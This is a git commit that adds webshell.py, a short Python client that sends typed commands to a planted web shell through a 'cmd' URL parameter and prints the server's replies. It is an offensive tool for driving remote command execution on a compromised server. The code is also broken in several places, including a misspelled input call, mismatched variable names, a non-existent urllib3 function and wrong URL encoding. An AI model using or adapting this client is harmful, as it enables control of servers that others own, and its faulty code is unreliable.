9e55f445b43825b3f58b81400e484d8d407d3dec
Zack007-as <84616617+Zack007-as@users.noreply.github.com>
2021-05-22 10:25:18 +0300

    Add files via upload

---
+++ webshell.py
@@ -0,0 +1,9 @@
+import urllib3,sys
+
+shell = sys.argv[1]
+host = shell.split("/")[2]
+while True:
+    command = raw.input("sh33l@{0}~#".format(host))
+    reql = str("{0}?cmd={1}".format(shell,command)).replace(" ","20%")
+    request = urllib3.urlopen(req1)
+    print request.read() #server response
